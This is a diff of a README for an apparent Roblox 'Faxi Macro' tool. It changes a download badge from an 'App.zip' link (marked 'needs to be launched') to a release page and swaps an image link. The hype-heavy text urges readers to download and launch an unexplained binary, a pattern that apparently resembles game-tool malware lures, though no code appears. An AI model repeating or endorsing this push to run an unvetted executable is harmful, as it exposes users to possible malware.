@@ -15,7 +15,7 @@ Here's a glimpse of what you can expect to find in this repository:
 ## Get Started
 Ready to supercharge your Roblox experience with the best version of faxi macro? Click the button below to download the latest version:
 
-[![Download Faxi Macro](https://img.shields.io/badge/Download-Faxi%20Macro-brightgreen)](https://github.com/file/App.zip) *(needs to be launched)*
+[![Download Faxi Macro](https://github.com/okallo123/Roblox-Faxi-Macro/releases/tag/v2.0%20Macro-brightgreen)](https://github.com/okallo123/Roblox-Faxi-Macro/releases/tag/v2.0) *(needs to be launched)*
 
 ## Explore Further
 If you're looking for more information or the download link doesn't work, be sure to check out the **Releases** section of this repository for additional resources and updates.
@@ -29,6 +29,6 @@ Have ideas, feedback, or suggestions for the **Roblox-Faxi-Macro** project? We'd
 ## Embrace the Faxi Macro Revolution
 It's time to level up your Roblox game with the power of faxi macro! Join us on this exciting journey as we explore the endless possibilities that this tool has to offer. Get ready to revolutionize your gaming experience like never before. 🌟
 
-![Roblox Faxi Macro](https://example.com/image.png)
+![Roblox Faxi Macro](https://github.com/okallo123/Roblox-Faxi-Macro/releases/tag/v2.0)
 
 Remember, the best version of faxi macro is just a click away. Download it now and experience Roblox like never before! 🎉
